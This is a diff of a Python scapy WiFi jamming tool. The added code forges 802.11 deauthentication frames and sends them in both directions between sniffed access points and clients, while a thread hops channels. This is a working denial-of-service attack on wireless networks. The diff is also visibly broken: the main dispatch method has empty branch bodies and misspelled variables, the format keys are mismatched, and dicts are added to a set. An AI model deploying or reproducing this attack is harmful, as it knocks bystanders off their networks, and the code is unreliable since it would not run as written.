@@ -7,6 +7,7 @@ import threading
 import os
 import time
 import signal
+import random
 import subprocess
 import re
 
@@ -15,6 +16,8 @@ from scapy.sendrecv import sniff
 from scapy.layers.dot11 import Dot11Beacon
 from scapy.layers.dot11 import Dot11
 from scapy.layers.dot11 import Dot11Elt
+from scapy.layers.dot11 import RadioTap
+from scapy.layers.dot11 import Dot11Deauth
 from scapy.layers.eap   import EAPOL
 
 def getNICnames():
@@ -172,47 +175,6 @@ def collectDev():
 
 def apDeauth(sc,dst="FF:FF:FF:FF:FF:FF"):
 	deauthDev2(sc, dst)
-	
-def sig_handle(signal, frame):
-	os.system('clear')
-	print O+"Cleaning up Your Sexy Mess"
-	global interface
-	monModeOff(interface)
-	sys.exit()
-
-def help():
-	sys.exit(__doc__)
-
-def main():
-	global allc_, ap_, cl_, out_
-	try:
-		opts, noopts = getopt(sys.argv[1:], "a:c:lho:", ['ap=', 'client=', 'all', 'help', 'out='])
-	except GetoptError:
-		help()
-	for o,v in opts:
-		if o == '-l' or o == '--all':
-			allc_ = 1
-		elif o == '-a' or o == '--ap':
-			ap_ = v
-		elif o == '-c' or o == '--client':
-			cl_ = v
-		elif o == '-h' or o == '--help':
-			help()
-		elif o == '-o' or o == '--out':
-			for n in v.split(','):
-				out_.append(n)
-		else:
-			sys.exit('No Such Options %s' % o)
-
-def macMass(bssid):
-	if len(bssid) == 17:
-		exp = re.match('^[a-fA-F0-9:]{17}|[a-fA-F0-9]{12}$', bssid, re.I)
-		if exp:
-			return True
-		else:
-			return False
-	else:
-		return False
 
 class JAMMER:
 
@@ -243,16 +205,93 @@ class JAMMER:
 
 		return essid
 
+	def forge(self, sn, rc):
+		pkt = RadioTap() / Dot11(
+				addr1=rc,
+				addr2=sn,
+				addr3=sn
+			) / Dot11Deauth(
+				reason=self.code
+			)
+
+		return pkt
+
+	def send(self, sender, receiver):
+		pkts = (
+			self.forge(sender, receiver),
+			self.forge(receiver, sender)
+		)
+
+		for pkt in pkts:
+			sendp(
+				pkt,
+				iface=self.interface,
+				count=self.packets,
+				verbose=False
+			)
+			pull.print("*",
+				"Sent Deauths Count [{count}] Code [{Code}] {sender} -> {receiver} ".format(
+					count=self.packets,
+					code =self.code,
+					sender=sender.upper(),
+					receiver=sender.upper()
+				),
+				pull.YELLOW
+			)
+
+	def deauthenticate(self, sender, receiver):
+		if self.aps and self.stations and self.filters:
+			
+		elif self.aps and self.stations and not self.filters:
+
+		elif self.aps and not self.stations and self.filters:
+
+		elif not self.aps and self.stations and self.filters:
+
+		elif self.aps and not stations and not self.filters:
+
+		elif not self.aps and not self.stations and self.filters:
+
+		elif not self.aps and self.sations and not self.filters:
+
+		else:
+			self.send(sender, receiver)
+
 	def injector(self, pkt):
 		if pkt.haslayer(Dot11Beacon):
 			macaddr = pkt.getlayer(Dot11).addr2
 			essid   = self.extract_essid(pkt.getlayer(Dot11Elt))
 			self.__ACCESSPOINTS.add(
-					macaddr
+					{
+						'bssid': macaddr,
+						'essid': essid
+					}
 				)
 		elif pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type == long(2) and not pkt.haslayer(EAPOL):
+			sender   = pkt.getlayer(Dot11).addr2
+			receiver = pkt.getlayer(Dot11).addr1
+
+			self.deauthenticate(sender, receiver)
+
+	def hopper(self, chs):
+		if type(chs) == list:
+			ch = random.choice(chs)
+			while True:
+				subprocess.call(['iwconfig', self.interface, 'channel', ch])
+				time.sleep(0.5)
+
+				lc = ch
+				ch = random.choice(chs)
+				while ch == lc:
+					ch = random.choice(chs)
+		else:
+			subprocess.call(['iwconfig', self.interface, 'channel', chs])
 
 	def engage(self):
+		t = threading.Thread(target=self.hopper, args=(self.channel,))
+		t.daemon = True
+		t.start()
+
 		sniff(iface=self.interface, prn=self.injector)
 
 class PARSER:
@@ -307,7 +346,7 @@ class PARSER:
 		if aps:
 			aps = aps.split(",")
 			for ap in aps:
-				ap = ap.upper()
+				ap = ap.lower()
 				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", ap):
 					retval.append(ap)
 				else:
@@ -320,7 +359,7 @@ class PARSER:
 		if sts:
 			sts = sts.split(",")
 			for st in sts:
-				st = st.upper()
+				st = st.lower()
 				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", st):
 					retval.append(st)
 				else:
@@ -333,7 +372,7 @@ class PARSER:
 		if fts:
 			fts = fts.split(",")
 			for ft in fts:
-				ft = ft.upper()
+				ft = ft.lower()
 				if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", ft):
 					retval.append(ft)
 				else:
